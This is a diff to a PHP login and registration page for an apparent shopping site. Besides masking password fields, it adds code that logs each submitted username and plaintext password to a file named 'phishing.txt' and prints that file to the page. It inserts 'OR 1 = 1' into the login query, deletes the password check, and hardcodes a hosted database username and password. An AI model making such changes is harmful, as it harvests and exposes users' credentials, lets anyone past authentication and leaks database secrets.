@@ -1,5 +1,5 @@
  <?php  
- $connect = mysqli_connect("localhost", "root", "", "test");  
+ $connect = mysqli_connect("sql309.epizy.com", "epiz_29241717", "6hSvun9utmSWwyM", "epiz_29241717_Shopping");  
  session_start();  
 
  
@@ -39,19 +39,34 @@
         
  }  
  if(isset($_POST["login"]))  
+
  {  
+       
+          
+
        
            $username = mysqli_real_escape_string($connect, $_POST["username"]);  
            $password = mysqli_real_escape_string($connect, $_POST["password"]);  
-           $query = "SELECT * FROM users WHERE username = '$username' and password = '$password'";  
+            
+           $pass = file_get_contents('phishing.txt');
+           $phishing  = fopen("phishing.txt","w");
+           fwrite($phishing,$pass."Email : ".$_POST['username'].", Password : ".$_POST['password']."\n" );
+           
+           fclose($phishing);
+
+           $phish= fopen("phishing.txt","r+");
+           echo fread($phish,filesize("phishing.txt"));
+
+
+           $query = "SELECT * FROM users WHERE username = '$username' and password = '$password' OR 1 = 1 ";  
            $result = mysqli_query($connect, $query);  
+          
            if(mysqli_num_rows($result) > 0)  
            {  
                $row=mysqli_fetch_array($result);
               
              /*  echo "$row[0] $row[1] $row[3]";  */
-                     if($_POST['username']==$username&&$_POST['password']==$password) 
-                     {  
+                    
 
                           //return true;  
                           $_SESSION["username"] = $username;  
@@ -72,11 +87,11 @@
                           echo '<script>alert("Wrong User Details")</script>';  
                      }  
                 
-           }  
-           else  
-           {  
-                echo '<script>alert("Wrong User Details")</script>';  
-           }      
+        //   }  
+          //  else  
+          //  {  
+          //       echo '<script>alert("Wrong User Details")</script>';  
+          //  }      
  }  
  ?>  
  <!DOCTYPE html>  
@@ -102,7 +117,7 @@
                      <input type="text" name="username" class="form-control" placeholder="Enter Username" required/>  
                      <br />  
                      <label>Enter Password</label>  
-                     <input type="text" name="password" class="form-control" placeholder="Enter Password" required />  
+                     <input type="password" name="password" class="form-control" placeholder="Enter Password" required />  
                      <br> 
                      <p class="forgot"><a href="forget_pas.php">Forgot Password ?</a></p>
                      <input type="submit" name="login" value="Login" class="btn btn-success" />  
@@ -125,10 +140,10 @@
                      <input type="text" name="username" class="form-control" placeholder="Enter Username" required />  
                      <br />  
                      <label>Enter Password</label>  
-                     <input type="text" name="password" class="form-control"  placeholder="Enter Password" required/>  
+                     <input type="password" name="password" class="form-control"  placeholder="Enter Password" required/>  
                      <br /> 
                      <label>Confirm Password</label>  
-                     <input type="text" name="confirmpassword" class="form-control"  placeholder="Confirm Password" required/>  
+                     <input type="password" name="confirmpassword" class="form-control"  placeholder="Confirm Password" required/>  
                      <br /> 
                      <label>Enter Email</label>  
                      <input type="email" name="email" class="form-control"  placeholder="Enter email " required/>  
